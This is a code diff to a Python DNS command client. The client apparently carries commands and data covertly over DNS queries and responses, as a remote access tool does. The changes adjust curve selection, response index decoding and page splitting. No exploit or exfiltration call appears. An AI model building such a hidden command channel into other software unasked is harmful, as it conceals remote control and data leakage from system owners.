@@ -95,7 +95,7 @@ class DnsCommandsClient(Thread):
                 ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
             ])))
 
-        self.encoder = ECPV(public_key=key)
+        self.encoder = ECPV(public_key=key, curve='brainpoolP256r1')
         self.spi = None
         self.kex = None
         self.poll = 60
@@ -173,12 +173,13 @@ class DnsCommandsClient(Thread):
             for part in [ int(x) << (3-i)*8 for i,x in enumerate(address.split('.')) ]:
                 raw |= part
 
-            idx = (raw & 0x1E000000) >> 25
+            idx = (raw & 0x3E000000) >> 25
+
             bits = (raw & 0x01FFFFFE) >> 1
             resp[idx] = struct.pack('>I', bits)[1:]
 
         data = b''.join(resp)
-        length = struct.unpack_from('B', data)[0]
+        length, = struct.unpack_from('B', data)
         payload = data[1:1+length]
 
         decoded = None
@@ -192,21 +193,29 @@ class DnsCommandsClient(Thread):
         return decoded
 
     def _q_page_encoder(self, data):
-        if len(data) > 35:
-            raise ValueError('Too big page size')
+        data_append = ''
+        ldata = len(data)
+
+        if ldata > 35:
+            if CLIENT_VERSION > 1 and (ldata - 35 + 4 + 1 + 8 + 6 < 35):
+                data, data_append = data[:35], data[35:]
+            else:
+                raise ValueError('Too big page size ({})'.format(ldata))
 
         nonce = self.nonce
         node_block = ''
 
         if CLIENT_VERSION > 1:
-            node_block = struct.pack('>BQ', CLIENT_VERSION, self.cid) + to_bytes(self.node, 6)
+            node_block = data_append + struct.pack('>BQ', CLIENT_VERSION, self.cid)
+            node_block += to_bytes(self.node, 6)
 
         payload = self.encoder.encode(data + node_block, nonce, symmetric=True)
         payload_len = len(payload)
 
         if node_block:
-            len_node_block = payload_len - len(data)
-            payload, node_block = payload[:len_node_block], payload[len_node_block:]
+            len_node_block = payload_len - (ldata - len(data_append))
+            split_offset = payload_len - len_node_block
+            payload, node_block = payload[:split_offset], payload[split_offset:]
 
         encoded = '.'.join([
             ''.join([
